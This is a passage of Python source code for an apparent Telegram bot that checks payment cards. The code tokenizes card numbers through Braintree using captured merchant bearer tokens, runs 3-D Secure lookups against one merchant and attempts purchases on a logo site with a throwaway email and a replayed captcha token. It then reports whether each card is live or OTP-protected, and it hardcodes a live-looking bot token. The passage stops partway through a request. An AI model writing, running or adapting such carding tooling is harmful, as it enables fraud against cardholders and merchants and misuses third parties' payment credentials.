import requests,re
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters
import time
import requests
from telegram.ext import CommandHandler, MessageHandler, filters, Updater, CallbackContext
from telegram.error import BadRequest

COLOR_RED = '\033[91m'
COLOR_BLUE = '\033[94m'
COLOR_GREEN = '\033[92m'
COLOR_RESET = '\033[0m'
# Replace with your bot token
last_request_time = {}
BOT_TOKEN = '7528445359:AAFS6CY76b7oqYxlcfd0LC70ZexF2OEjGdQ'
csv_file_path = ('C:\\Users\\bahri\\Downloads\\bin-list-data.csv')
import re

def clean_input(input_str):
    # Use regex to remove everything that is not a digit or the '|' character
    cleaned_str = re.sub(r'[^0-9|]', '', input_str)
    return cleaned_str

# Example usage
input_str = "/chk 4033060081706027|05|27|917"
cleaned = clean_input(input_str)
print(cleaned)

import requests
BOT_TOKEN = '7528445359:AAFS6CY76b7oqYxlcfd0LC70ZexF2OEjGdQ'
# Replace with your chat ID

from time import sleep
import time
import pycountry

def country_info(country_code):
    # Get the country information using the three-letter country code
    country = pycountry.countries.get(alpha_3=country_code.upper())
    if not country:
        return "🏳️", "Unknown Country"  # Return a generic flag and unknown country if code isn't recognized

    # Get the two-letter code for the flag and the country name
    two_letter_code = country.alpha_2
    country_name = country.name
    
    # Convert the two-letter code to a flag emoji

    return  country_name

# Example usage



import pycountry

def country_code_to_flag(country_code):
    # Get the country using pycountry
    country = pycountry.countries.get(alpha_3=country_code.upper())
    if not country:
        return "🏳️"  # Return a generic flag if the code isn't recognized

    # Convert the two-letter country code to a flag emoji
    two_letter_code = country.alpha_2
    flag = ''.join(chr(127397 + ord(letter)) for letter in two_letter_code)
    return flag

# Example usage
country_code = 'USA'
flag_emoji = country_code_to_flag(country_code)


def send_telegram_message(message):
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
    payload = {
        'chat_id': CHAT_ID,
        'text': message
    }
    requests.post(url, data=payload)

import re

def clean_input(input_str):
    # Use regex to remove everything that is not a digit or the '|' character
    cleaned_str = re.sub(r'[^0-9|]', '', input_str)
    return cleaned_str

# Example usage
input_str = "/chk 4033060081706027|05|27|917"
cleaned = clean_input(input_str)
print(cleaned)


# Function to handle incoming credit card information













def vbv(ccx) :
    import requests

    cc, mm, yy, cvc = ccx.strip().split('|')
    start_time_payment = time.time()

    headers = {
        'accept': '*/*',
        'accept-language': 'fr,fr-FR;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
        'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzAxOTI5OTEsImp0aSI6IjkwN2M5OWM3LWY2NzItNDdjMS1hOWI1LWY0Y2U2NTY3MzAxYSIsInN1YiI6IjY2M205Mjh4YmdtdzJwdDQiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjY2M205Mjh4YmdtdzJwdDQiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6Imhhcm1vbnlHQlAifX0.ziI26t-eJzn8JAE6XWoSrPf5Bn_V4D3bFbhwsDCvSKc5osd3KSG2aS0uAWb5GcooAw9fCtYYwV1keL4wL1_YDA',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'priority': 'u=1, i',
        'referer': 'https://assets.braintreegateway.com/',
        'sec-ch-ua': '"Chromium";v="130", "Microsoft Edge";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0',
    }

    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': 'e3a29617-3924-473b-9f6b-60c34a911d2b',
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': cc,
                    'expirationMonth': mm,
                    'expirationYear': yy,
                    'cvv': '502',
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }

    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
    tok = response.json()['data']['tokenizeCreditCard']['token']
    import requests

    headers = {
        'accept': '*/*',
        'accept-language': 'fr,fr-FR;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
        'content-type': 'application/json',
        'origin': 'https://www.harmonystore.co.uk',
        'priority': 'u=1, i',
        'referer': 'https://www.harmonystore.co.uk/',
        'sec-ch-ua': '"Chromium";v="130", "Microsoft Edge";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0',
    }

    json_data = {
        'amount': '3.99',
        'additionalInfo': {
            'billingLine1': '15 Auster Road',
            'billingLine2': 'miami',
            'billingCity': 'Peterborough',
            'billingPostalCode': 'PE2 8FS',
            'billingCountryCode': 'GB',
            'billingPhoneNumber': '44 854 854',
            'billingGivenName': '\\u006a\\u006f\\u0068\\u006e',
            'billingSurname': '\\u0073\\u006d\\u0069\\u0074\\u0068',
        },
        'challengeRequested': True,
        'bin': '527069',
        'dfReferenceId': '1_3097238d-c221-4402-aec6-f73a5956ef0a',
        'clientMetadata': {
            'requestedThreeDSecureVersion': '2',
            'sdkVersion': 'web/3.94.0',
            'cardinalDeviceDataCollectionTimeElapsed': 219,
            'issuerDeviceDataCollectionTimeElapsed': 5499,
            'issuerDeviceDataCollectionResult': True,
        },
        'authorizationFingerprint': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzAxOTI5OTEsImp0aSI6IjkwN2M5OWM3LWY2NzItNDdjMS1hOWI1LWY0Y2U2NTY3MzAxYSIsInN1YiI6IjY2M205Mjh4YmdtdzJwdDQiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjY2M205Mjh4YmdtdzJwdDQiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6Imhhcm1vbnlHQlAifX0.ziI26t-eJzn8JAE6XWoSrPf5Bn_V4D3bFbhwsDCvSKc5osd3KSG2aS0uAWb5GcooAw9fCtYYwV1keL4wL1_YDA',
        'braintreeLibraryVersion': 'braintree/web/3.94.0',
        '_meta': {
            'merchantAppId': 'www.harmonystore.co.uk',
            'platform': 'web',
            'sdkVersion': '3.94.0',
            'source': 'client',
            'integration': 'custom',
            'integrationType': 'custom',
            'sessionId': 'e3a29617-3924-473b-9f6b-60c34a911d2b',
        },
    }

    response = requests.post(
        f'https://api.braintreegateway.com/merchants/663m928xbgmw2pt4/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
        headers=headers,
        json=json_data,
    )
    payment_request_time = time.time() - start_time_payment
    bin_number = response.json()['paymentMethod']['details']['bin']
    card_type = response.json()['paymentMethod']['details']['cardType']
    issuing_bank = response.json()['paymentMethod']['binData']['issuingBank']
    country = response.json()['paymentMethod']['binData']['countryOfIssuance']
    if response.json()['paymentMethod']['binData']['debit'] == "yes" :
        r = 'debit'
    elif response.json()['paymentMethod']['binData']['prepaid'] == "yes" :
        r = 'prepaid'
    else :
        r = 'credit'
    fc = country_info(country)
    emo = country_code_to_flag(country)
    print(response.json())
    if response.json()['paymentMethod']['binData']['debit'] == "yes" :
        r = 'debit'
    elif response.json()['paymentMethod']['binData']['prepaid'] == "yes" :
        r = 'prepaid'
    else :
        r = 'credit'
    fc = country_info(country)
    emo = country_code_to_flag(country)
    if 'challenge' in response.text : 
        m= (    f"OTP ✅\n\n"
                f"𝗖𝗮𝗿𝗱: {cc}|{mm}|{yy}|{cvc}\n"
                f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Braintree 3DS\n"
                f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {response.json()['paymentMethod']['threeDSecureInfo']['status']}\n\n"
                f"𝗜𝗻𝗳𝗼: BIN: {bin_number}\n"
                f"𝐈𝐬𝐬𝐮𝐞𝐫: {issuing_bank} - {r}\n"
                f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {fc} {emo}\n\n"
                f"𝗧𝗶𝗺𝗲: {payment_request_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬")
        print(m)
        return m
        sleep(10)

    else  :
        m= (    f"OTP ❌\n\n"
                f"𝗖𝗮𝗿𝗱: {cc}|{mm}|{yy}|{cvc}\n"
                f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Braintree 3DS\n"
                f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {response.json()['paymentMethod']['threeDSecureInfo']['status']}\n\n"
                f"𝗜𝗻𝗳𝗼: BIN: {bin_number}\n"
                f"𝐈𝐬𝐬𝐮𝐞𝐫: {issuing_bank} - {r}\n"
                f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {fc} {emo}\n\n"
                f"𝗧𝗶𝗺𝗲: {payment_request_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬")
        
        print(m)
        return m
        sleep(10)

























def Tele(ccx):
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]

    r = re

    
    headers = {
        'accept': '*/*',
        'accept-language': 'fr,fr-FR;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
        'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3Mjk1MjMwOTAsImp0aSI6IjZjZmExYWQ4LTY0MTAtNGU0MS04M2MyLTJhNTZiMTIwNDgyNiIsInN1YiI6ImZ6anc5bXIyd2RieXJ3YmciLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImZ6anc5bXIyd2RieXJ3YmciLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.gMRrQSR9xJ_dZKkCErJ1BRVgErPcxJiTmozn-9auzADqa36GzQxCE_5GhLL_FJTdJZ6_Pj5t9a5AozzMFao5Dg',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'priority': 'u=1, i',
        'referer': 'https://assets.braintreegateway.com/',
        'sec-ch-ua': '"Chromium";v="130", "Microsoft Edge";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0',
    }
    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'dropin2',
            'sessionId': '246ca1fa-3499-4a6e-a987-c3e4ce24bf76',
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': n,
                    'expirationMonth': mm,
                    'expirationYear': yy,
                    'cvv': cvc,
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }

    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)


    tok=(response.json()['data']['tokenizeCreditCard']['token'])
    token = response.json()['data']['tokenizeCreditCard']['token']
    credit_card_data = response.json()['data']['tokenizeCreditCard']['creditCard']
    issuer = credit_card_data['binData']['issuingBank']
    country = credit_card_data['binData']['countryOfIssuance']
    bin_data = credit_card_data['bin']
    cookies = {
        '_ga': 'GA1.2.1708768539.1729436653',
        '_gid': 'GA1.2.1508049928.1729436653',
        '_gat': '1',
        '_ga_93VBC82KGM': 'GS1.2.1729436654.1.1.1729436685.0.0.0',
    }

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'fr,fr-FR;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
        'content-type': 'application/json;charset=UTF-8',
        # 'cookie': '_ga=GA1.2.1708768539.1729436653; _gid=GA1.2.1508049928.1729436653; _gat=1; _ga_93VBC82KGM=GS1.2.1729436654.1.1.1729436685.0.0.0',
        'origin': 'https://app.brandmark.io',
        'priority': 'u=1, i',
        'referer': 'https://app.brandmark.io/v3/',
        'sec-ch-ua': '"Chromium";v="130", "Microsoft Edge";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0',
    }

    json_data = {
        'tier': 'basic',
        'email': '508disastrous@awgarstone.com',
        'payload': {
            'nonce': tok,
            'details': {
                'expirationMonth': '09',
                'expirationYear': '2028',
                'bin': '516734',
                'cardType': 'MasterCard',
                'lastFour': '3483',
                'lastTwo': '83',
            },
            'type': 'CreditCard',
            'description': 'ending in 83',
            'deviceData': '{"device_session_id":"c5a64536ff73fd0430b41047b69b38fb","fraud_merchant_id":null,"correlation_id":"e6c6863eebe58d5fc84a0789a0e19a6b"}',
            'binData': {
                'prepaid': 'No',
                'healthcare': 'No',
                'debit': 'Yes',
                'durbinRegulated': 'No',
                'commercial': 'Unknown',
                'payroll': 'No',
                'issuingBank': 'CREDIT EUROPE BANK',
                'countryOfIssuance': 'ROU',
                'productId': 'TCS',
            },
        },
        'discount': False,
        'referral': None,
        'params': {
            'id': 'logo-eb1c4e62-b613-4c49-80e7-918719ff4df3',
            'layout': 0,
            'title': 'gkk',
            'titleFamily': 'Comfortaa Bold Alt2',
            'titleVariant': '700',
            'titleColor': [
                {
                    'hex': '#543cda',
                    'location': 0,
                },
                {
                    'hex': '#d424a7',
                    'location': 1,
                },
            ],
            'titleScale': 3,
            'titleLetterSpace': 6,
            'titleLineSpace': 1.1,
            'titleBoldness': 0,
            'titleX': 0,
            'titleY': 0,
            'titleAlign': 'center',
            'slogan': '',
            'sloganFamily': 'Orienta',
            'sloganVariant': '400',
            'sloganColor': [
                {
                    'hex': '#543cda',
                },
            ],
            'sloganScale': 3,
            'sloganLetterSpace': 0,
            'sloganLineSpace': 1.1,
            'sloganBoldness': 0,
            'sloganAlign': 'center',
            'sloganX': 0,
            'sloganY': 0,
            'icon': None,
            'showIcon': False,
            'iconScale': 1,
            'iconColor': [
                {
                    'hex': '#543cda',
                },
            ],
            'iconContainer': None,
            'showIconContainer': False,
            'iconContainerScale': 1,
            'iconContainerColor': [
                {
                    'hex': '#eeb4df',
                },
            ],
            'iconSpace': 1,
            'iconX': 0,
            'iconY': 0,
            'nthChar': 0,
            'container': None,
            'showContainer': False,
            'containerScale': 1,
            'containerColor': [
                {
                    'hex': '#eeb4df',
                },
            ],
            'containerX': 0,
            'containerY': 0,
            'backgroundColor': [
                {
                    'hex': '#fcfcfc',
                },
            ],
            'palette': [
                '#fcfcfc',
                '#543cda',
                '#7e34c9',
                '#a92cb8',
                '#d424a7',
            ],
            'keywords': [
                'hhhh',
            ],
        },
        'svg': '<!--?xml version="1.0" encoding="UTF-8" standalone="no"?-->\n<svg xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:cc="http://creativecommons.org/ns#" xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#" xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="svg416906" viewBox="0 0 1024 768" height="768px" width="1024px" version="1.1">\n  <metadata id="metadata416912">\n    <rdf:rdf>\n      <cc:work rdf:about="">\n        <dc:format>image/svg+xml</dc:format>\n        <dc:type rdf:resource="http://purl.org/dc/dcmitype/StillImage"></dc:type>\n      </cc:work>\n    </rdf:rdf>\n  </metadata>\n  <defs id="defs416910"></defs>\n  <linearGradient spreadMethod="pad" y2="30%" x2="-10%" y1="120%" x1="30%" id="3d_gradient2-logo-eb1c4e62-b613-4c49-80e7-918719ff4df3">\n    <stop id="stop416887" stop-opacity="1" stop-color="#ffffff" offset="0%"></stop>\n    <stop id="stop416889" stop-opacity="1" stop-color="#000000" offset="100%"></stop>\n  </linearGradient>\n  <linearGradient gradientTransform="rotate(-30)" spreadMethod="pad" y2="30%" x2="-10%" y1="120%" x1="30%" id="3d_gradient3-logo-eb1c4e62-b613-4c49-80e7-918719ff4df3">\n    <stop id="stop416892" stop-opacity="1" stop-color="#ffffff" offset="0%"></stop>\n    <stop id="stop416894" stop-opacity="1" stop-color="#cccccc" offset="50%"></stop>\n    <stop id="stop416896" stop-opacity="1" stop-color="#000000" offset="100%"></stop>\n  </linearGradient>\n  <g id="logo-group">\n    <image xlink:href="" id="container" x="272" y="144" width="480" height="480" style="display: none;" transform="translate(0 0)"></image>\n    <g id="logo-center" transform="translate(0 0)">\n      <image xlink:href="" id="icon_container" x="0" y="0" style="display: none;"></image>\n      <g id="slogan" style="font-style:normal;font-weight:400;font-size:32px;line-height:1;font-family:Orienta;font-variant-ligatures:none;text-align:center;text-anchor:middle" transform="translate(0 0)"></g>\n      <g id="title" style="font-style:normal;font-weight:700;font-size:72px;line-height:1;font-family:\'Comfortaa Bold Alt2\';font-variant-ligatures:none;text-align:center;text-anchor:middle" transform="translate(0 0)">\n        <path id="path416915" style="font-style:normal;font-weight:700;font-size:72px;line-height:1;font-family:\'Comfortaa Bold Alt2\';font-variant-ligatures:none;text-align:center;text-anchor:middle" d="m 491.03,-19.728 c 0,-5.544 -2.016,-10.224 -5.904,-14.184 -3.96,-3.888 -8.64,-5.904 -14.184,-5.904 -5.544,0 -10.224,2.016 -14.184,5.904 -3.888,3.96 -5.832,8.64 -5.832,14.184 0,5.544 1.944,10.224 5.832,14.184 3.96,3.888 8.64,5.832 14.184,5.832 4.968,0 9.288,-1.584 13.104,-4.824 v 1.368 c 0,3.6 -1.296,6.696 -3.816,9.216 -2.592,2.592 -5.688,3.816 -9.288,3.816 -2.232,0 -4.32,-0.504 -6.264,-1.584 -1.944,-1.008 -3.528,-2.52 -4.68,-4.392 -0.576,-0.792 -1.296,-1.296 -2.232,-1.44 -0.936,-0.216 -1.8,-0.072 -2.592,0.432 -0.792,0.504 -1.296,1.224 -1.512,2.16 -0.216,0.936 0,1.8 0.504,2.592 1.224,1.944 2.736,3.6 4.464,4.968 1.728,1.368 3.672,2.376 5.76,3.096 2.088,0.72 4.32,1.08 6.552,1.08 5.544,0 10.224,-1.944 14.112,-5.832 3.888,-3.888 5.904,-8.568 5.904,-14.112 V -18 c 0,-0.576 0.072,-1.152 0.072,-1.728 z m -20.088,12.96 c -3.6,0 -6.624,-1.224 -9.144,-3.816 -2.592,-2.52 -3.816,-5.544 -3.816,-9.144 0,-3.6 1.224,-6.624 3.816,-9.216 2.52,-2.52 5.544,-3.816 9.144,-3.816 3.6,0 6.624,1.296 9.216,3.816 2.52,2.592 3.816,5.616 3.816,9.216 0,3.6 -1.296,6.624 -3.816,9.144 -2.592,2.592 -5.616,3.816 -9.216,3.816 z" stroke-width="0" stroke-linejoin="miter" stroke-miterlimit="2" fill="#543cda" stroke="#543cda" transform="translate(0 336.952) translate(310.384805 -13.216000000000008) scale(3) translate(-450.926 39.816)"></path>\n        <path id="path416917" style="font-style:normal;font-weight:700;font-size:72px;line-height:1;font-family:\'Comfortaa Bold Alt2\';font-variant-ligatures:none;text-align:center;text-anchor:middle" d="m 532.41425,-3.024 c 0,-0.864 -0.288,-1.584 -0.792,-2.16 l -13.968,-17.136 13.248,-11.808 c 0.72,-0.576 1.152,-1.44 1.152,-2.448 0,-0.864 -0.36,-1.584 -0.936,-2.232 -0.648,-0.72 -1.44,-1.152 -2.448,-1.152 -0.864,0 -1.656,0.36 -2.232,0.936 l -17.496,15.624 v -29.304 c 0,-1.008 -0.36,-1.872 -1.008,-2.52 -0.648,-0.648 -1.512,-1.008 -2.52,-1.008 -1.08,0 -1.944,0.36 -2.592,1.008 -0.648,0.648 -0.936,1.512 -0.936,2.52 v 49.176 c 0,1.08 0.288,1.944 0.936,2.592 0.648,0.648 1.512,0.936 2.592,0.936 1.008,0 1.872,-0.288 2.52,-0.936 0.648,-0.648 1.008,-1.512 1.008,-2.592 v -11.016 l 3.6,-3.168 13.68,16.92 c 0.648,0.864 1.512,1.296 2.592,1.296 0.792,0 1.584,-0.288 2.304,-0.864 0.864,-0.72 1.296,-1.584 1.296,-2.664 z" stroke-width="0" stroke-linejoin="miter" stroke-miterlimit="2" fill="#9430c1" stroke="#9430c1" transform="translate(0 336.952) translate(481.2655550000001 -62.464) scale(3) translate(-501.88625 56.232)"></path>\n        <path id="path416919" style="font-style:normal;font-weight:700;font-size:72px;line-height:1;font-family:\'Comfortaa Bold Alt2\';font-variant-ligatures:none;text-align:center;text-anchor:middle" d="m 573.33613,-3.024 c 0,-0.864 -0.288,-1.584 -0.79201,-2.16 l -13.96799,-17.136 13.24799,-11.808 c 0.72,-0.576 1.15201,-1.44 1.15201,-2.448 0,-0.864 -0.36001,-1.584 -0.93601,-2.232 -0.648,-0.72 -1.43999,-1.152 -2.448,-1.152 -0.864,0 -1.656,0.36 -2.23199,0.936 L 549.86412,-23.4 v -29.304 c 0,-1.008 -0.35999,-1.872 -1.00799,-2.52 -0.64801,-0.648 -1.51201,-1.008 -2.52,-1.008 -1.08001,0 -1.94401,0.36 -2.592,1.008 -0.648,0.648 -0.936,1.512 -0.936,2.52 v 49.176 c 0,1.08 0.288,1.944 0.936,2.592 0.64799,0.648 1.51199,0.936 2.592,0.936 1.00799,0 1.87199,-0.288 2.52,-0.936 0.648,-0.648 1.00799,-1.512 1.00799,-2.592 v -11.016 l 3.6,-3.168 13.68001,16.92 c 0.64799,0.864 1.51199,1.296 2.592,1.296 0.792,0 1.58399,-0.288 2.30399,-0.864 0.86401,-0.72 1.29601,-1.584 1.29601,-2.664 z" stroke-width="0" stroke-linejoin="miter" stroke-miterlimit="2" fill="#d424a7" stroke="#d424a7" transform="translate(0 336.952) translate(622.031195 -62.464) scale(3) translate(-542.80813 56.232)"></path>\n      </g>\n      <image xlink:href="" id="icon" x="0" y="0" style="display: none;"></image>\n    </g>\n  </g>\n</svg>\n',
        'recaptcha_token': '03AFcWeA7lY6cNxwsz3BgKSrtpYpbb6-cQ5g985WXq8ootXw0qLlOuWAzr08L1rtTlOB_POufPAuTkylj9Cz5h8nZV2vsUoZQPXQRZc8cfQsj2Oryr5A4FmE06J68Re5OGL9_6FrRgRDH_WofeL3LcgPn9AfdCi5v2zQa7cSRZtB2dsiXbQ8OiF6gt3wbjdXP7ebxHVOXIt_eRupGV3qSawqcyYyzMqQywE92dlxmvawXwLPfsxoaCtb7xIqNpF-pikwmYb_lu9JAUR6qzvUYyKqf59VD3W_cQD9U0zwvAHnFxMHuBlCvaKFZX_qPwFMmwm21Jvr1He3Z_0Kl_Jg-Wtoaqzke66FtrM-6TyIaaMcMHzdpGcUhWSSI2xltJzv5OdydXwfy66rNPq024AWpPhXC2PAH9QFvN8kKDQKpTjbgwotlAkspH8RFx0b8FJYCzNKUYH9Zwy61vY0bKJuq0kVtmq260c1xlQRQ9e_VB1_EIiNY0p42wHkKlI5v5z-tWC7QtKXitVvd0x2ekY27vWs7Lq_VRF79DVMKpblTPsL8tIVcC3MCKx4LnNlGH97MUE8_sal25SnSC1HglqbyKpoyr0WjY3fLtofwRoOwAa_ApyrARXzQHw2M8JeZxlZzR4c2OxBlrapSFIFCqS-Y04CgCv5yafzX3JqNPhBtK_3ZMJBjVyRLt6orUBw0K9dBwW3OzYKAxSX3k6v4BK5ffP-iGry7rzi7JEA9pFscZ_Gw28g4XRTJg6XrUx07l3ULyd2pmmtR6myqPfSoB4aKpKO9wiI9g1u3b6o5DLwjqUMteCvrAyzsOpGBffj65ql_iOJsORX9K_zDT9_B4f15u2sU0Ln5kwnrU8W7dzfkM5KWn8t0iCV0RrXragVqWgJiDBnktRuEA6EiwHw2CJr25_cAaHC7yiyl4pn-7W6tQfXdCzy8nCnGnQD7fhMOjVKmeO9xujWUmnT5P9BQB_UaDkkxlnJWcKamQLJRAuM-TfuvSGhHGN5Wxu9tdMrMgtKJRqW-2P6MWjc4SKQe2gOMO5u_Ad9V3dNZo3hlX98e3Axe1ndYawKdERb21iZ0om2JuCjYonIBfNTwQZVQ7REGWnxoJXgSksJYGIJQBUfGJYKdRkwhPxb-lM2tMN8xX_VS6aZ23jwIoqv5VnnP8oi7SVLCVZYrA-LJe2HhYssa3agKZvSB1v4csPvAgyDW7Kqcy-NaD8Rdz8IeYvXJ0k-WS8LEdsD-NOrBUeA9wXDgken3V1jjxrn42pWtURDahl_3732q5Uey08UnrRy_XFJvXD-fhY4IAckk6tBlCggkV7X2Fa07m5fyH8_44ADEJ5_KXboNkrkuO8WfJZHrzuUny2wYUsiYqGHKy90OwzPG4EkF07YWyZj_CZmXTZsz-OnR4T5Dlr7Eu43DMxL105S8aHrn-qg6aiKPRM4K9WMnsJusXQgZlFPPumPq3ePAQrefrb9zro6l5pbOJhtSe2OGywoWTiIY44qlxJ666OSxTohM3f32tsMxCHoy_kNSG2T8XHfRhEnp5tQlXZ4UAovtcDiplInjSbocL6JCmXic7COJHso5wfoEmgdLWULWRnMHxIFxiHCSMvoh1ABVOM7bUBG2dZ7wwkM14Y3mxKNWvy7yoXobucEdXcWQUxj944gTd2TYyYwCwaIyeAQHxqteLScTPEUnzSYK3dkVkieOfQSaTSKZAw0GBi2XKpEe_pIVgbg4OCgIDhl4GJkfdrvY6yfNHI78SCtS_Rw9u2KJwwYQoJktl2jdlFFTXTcZsnFSm_kiY7Fs7NQl3e-ghL9teMNXznreqDJgUVSeUXaXllUT3__lGEDkuES7tEL2a71kWO50H5TtSig_6fu4GDa4fm1QQKFzykiRiFq8y0pCsr1sbUTOWk_KOU30jNIYPo3KJrrOSgsioJfMEuWEm4J1mvhZubAYh76NUt36RyIS3Fn2q5_5NqW2gavRYNvkTXBKj4YmQNAaGjJA9QiPbpLD86Ev2V12_naMxc4h6j9sh-J9epmp91zt8UdVnyOjGJ1Gh2V376t3XtWVfkfthAImZ46Lgjz7sxu51XvQ1Qp8dxkg10GnP2stCwqUGub8MfUf6cn4eAHNf8Hpe3M018n5OJSmnbeUetmbpJIJ7hFdYJltMYdZ-Eom72x-kK5RrJwhQVNVWFi7bs2yx76JHj1mPC-1IcWo_dDZ8Ow',
